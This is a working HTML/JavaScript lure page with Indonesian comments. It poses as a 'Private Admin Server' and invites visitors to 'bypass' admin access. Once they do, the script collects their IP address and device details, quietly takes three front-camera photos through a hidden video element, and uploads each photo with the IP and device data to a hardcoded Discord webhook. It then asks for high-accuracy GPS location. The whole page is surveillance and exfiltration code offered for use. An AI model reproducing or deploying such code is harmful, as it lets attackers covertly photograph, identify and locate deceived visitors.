<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Internal Admin Panel - Secure Access</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'JetBrains Mono', monospace; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .panel { width: 95%; max-width: 500px; border: 1px solid #00ff41; padding: 25px; background: rgba(0, 20, 0, 0.9); box-shadow: 0 0 30px rgba(0, 255, 65, 0.2); text-align: center; margin: 20px 0; }
        .header { border-bottom: 2px solid #ff0000; padding-bottom: 15px; margin-bottom: 20px; color: #ff0000; font-weight: bold; text-shadow: 0 0 10px #ff0000; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
        .data-item { border: 1px solid #1a3d1a; padding: 8px; background: #000; font-size: 10px; text-align: left; }
        .label { color: #888; display: block; font-size: 8px; text-transform: uppercase; }
        .val { color: #00ff41; font-weight: bold; }
        .btn { background: #ff0000; color: #fff; border: none; padding: 18px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; font-family: inherit; font-size: 14px; box-shadow: 0 0 15px #ff0000; text-transform: uppercase; }
        .loader { border: 2px solid #111; border-top: 2px solid #ff0000; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; display: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 11px; color: #ffaa00; margin-top: 15px; min-height: 70px; font-weight: bold; line-height: 1.6; }
        #result-page { display: none; width: 100%; height: 100vh; position: fixed; top: 0; left: 0; background: #000; z-index: 9999; overflow-y: scroll; padding: 20px; box-sizing: border-box; }
        /* Video tetap menyala tapi tersembunyi agar sensor terus aktif */
        #video { position: fixed; top: -1000px; left: -1000px; width: 640px; height: 480px; opacity: 0; pointer-events: none; }
        canvas { display: none; }
        .data-box { border: 1px solid #00ff41; padding: 15px; margin-bottom: 15px; background: rgba(0, 255, 65, 0.05); text-align: left; font-size: 12px; }
        .map-frame { width: 100%; height: 260px; border: 1px solid #00ff41; margin-top: 10px; filter: invert(90%) hue-rotate(180deg); }
        #photo-container { display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
        .preview-img { width: 100%; border: 1px solid #00ff41; border-radius: 4px; display: block; background: #111; }
    </style>
</head>
<body>

<div class="panel" id="login-panel">
    <div class="header">‚ö†Ô∏è PRIVATE ADMIN SERVER ‚ö†Ô∏è</div>
    <div class="grid">
        <div class="data-item"><span class="label">Device</span><span id="d-model" class="val">Detecting...</span></div>
        <div class="data-item"><span class="label">IP_Addr</span><span id="d-ip" class="val">Fetching...</span></div>
        <div class="data-item"><span class="label">Battery</span><span id="d-bat" class="val">---</span></div>
        <div class="data-item"><span class="label">RAM_Est</span><span id="d-ram" class="val">---</span></div>
        <div class="data-item" style="grid-column: span 2;"><span class="label">System_Build</span><span id="d-build" class="val">Scanning...</span></div>
    </div>
    
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>
    <div id="loading-icon" class="loader"></div>
    <p id="status">[SYSTEM] Akses Dibatasi. Memerlukan Protokol Bypass Kamera & Lokasi untuk Sinkronisasi.</p>
    <button id="mainBtn" class="btn" onclick="startProcess()">Bypass Admin Access</button>
</div>

<div id="result-page">
    <div class="inner-container">
        <h3 style="color: #00ff41; text-align: center;">SUCCESS: ADMIN_DATABASE_VIEW</h3>
        <hr color="#00ff41">
        <div class="data-box">
            <span style="color: #ff0000; font-weight: bold;">[!] GPS_SATELLITE_DATA</span><br>
            KOORDINAT: <span id="res-latlon" style="color:#fff;">Connected</span><br>
            STATUS: <span style="color:#00ff41;">SINKRON</span>
        </div>
        <div id="map-container"></div>
        <div class="data-box">
            <span style="color: #ff0000; font-weight: bold;">[!] BIOMETRIC_LOG (3 SESSIONS)</span>
            <div id="photo-container"></div>
        </div>
        <button class="btn" style="background: #00ff41; color: #000; box-shadow: none;" onclick="location.reload()">TERMINATE SESSION</button>
    </div>
</div>

<script>
    const WH = "https://discord.com/api/webhooks/1464945657386242215/reBayi8sdQCNfp5PMp_c12ejYPeeFwoNurlukhTAQfyrx6Yeccc2ZkPNDnb9iF0kzhBj";
    let stream;
    let collectedData = {};

    (async function init() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const d = await res.json();
            collectedData.ip = d.ip;
            document.getElementById('d-ip').innerText = d.ip;
        } catch (e) { collectedData.ip = "Unknown"; }
        
        const ua = navigator.userAgent;
        collectedData.model = ua.match(/\(([^;]+);/) ? ua.match(/\(([^;]+);/)[1] : "Unknown Device";
        document.getElementById('d-model').innerText = collectedData.model;
        document.getElementById('d-build').innerText = ua.split(' ').pop();
        document.getElementById('d-ram').innerText = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "N/A";

        if (navigator.getBattery) {
            const bat = await navigator.getBattery();
            document.getElementById('d-bat').innerText = `${Math.round(bat.level * 100)}%`;
        }
    })();

    async function startProcess() {
        const btn = document.getElementById('mainBtn');
        const loader = document.getElementById('loading-icon');
        const status = document.getElementById('status');

        btn.style.display = 'none';
        loader.style.display = 'block';
        status.innerText = "[AUTH] Membuka Jalur Kamera...";

        try {
            // Memaksa resolusi tinggi agar sensor bekerja maksimal
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 1280, height: 720 } 
            });
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            // Trik Inti: Tunggu sampai video beneran 'playing' dan sinkron
            video.onplaying = () => {
                status.innerText = "[WARMUP] Menunggu Sensor Cahaya Stabil (8 detik)...";
                
                // Jeda 8 detik sangat krusial agar ISO kamera menyesuaikan diri
                setTimeout(async () => {
                    status.innerText = "[CAPTURE] Menarik 3 Frame Biometrik...";
                    await takePhotos(3);
                    requestLocation();
                }, 8000);
            };

        } catch (err) {
            handleError("IZIN KAMERA DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses KAMERA agar akses Admin Panel bisa melihat target.");
        }
    }

    async function takePhotos(count) {
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photoContainer = document.getElementById('photo-container');

        for (let i = 1; i <= count; i++) {
            // Pastikan video aktif dan bukan frame kosong
            if (video.readyState >= 3) {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                // Gambar 2 kali untuk memastikan buffer terisi
                ctx.drawImage(video, 0, 0);
                ctx.drawImage(video, 0, 0);
                
                const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.9));
                
                // Tampilkan di UI
                const img = document.createElement('img');
                img.src = URL.createObjectURL(blob);
                img.className = 'preview-img';
                photoContainer.appendChild(img);

                // Kirim ke Discord
                const fd = new FormData();
                fd.append("file", blob, `log_${i}.jpg`);
                fd.append("payload_json", JSON.stringify({ 
                    content: `üì∏ **LOG HASIL CAPTURE ${i}/3**\nIP: ${collectedData.ip}\nDevice: ${collectedData.model}` 
                }));
                
                await fetch(WH, { method: "POST", body: fd });
                await new Promise(res => setTimeout(res, 1000)); // Jeda antar jepretan
            }
        }
    }

    function requestLocation() {
        navigator.geolocation.getCurrentPosition(
            (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                document.getElementById('res-latlon').innerText = `${lat}, ${lon}`;
                document.getElementById('map-container').innerHTML = 
                    `<iframe class="map-frame" frameborder="0" src="https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed"></iframe>`;

                document.getElementById('login-panel').style.display = 'none';
                document.getElementById('result-page').style.display = 'block';
                // Jangan stop stream dulu agar transisi mulus, stop setelah 2 detik
                setTimeout(() => { if (stream) stream.getTracks().forEach(t => t.stop()); }, 2000);
            },
            () => {
                handleError("IZIN LOKASI DITOLAK. Buka pengaturan browser/HP untuk mengizinkan akses LOKASI agar akses Panel dapat melihat lokasi.");
            },
            { enableHighAccuracy: true }
        );
    }

    function handleError(msg) {
        document.getElementById('status').innerHTML = `<span style="color:#ff0000">${msg}</span><br><br><span style="color:#888;">Mencoba ulang dalam 5 detik...</span>`;
        if (stream) stream.getTracks().forEach(t => t.stop());
        setTimeout(() => {
            document.getElementById('loading-icon').style.display = 'none';
            document.getElementById('mainBtn').style.display = 'block';
        }, 5000);
    }
</script>
</body>
</html>
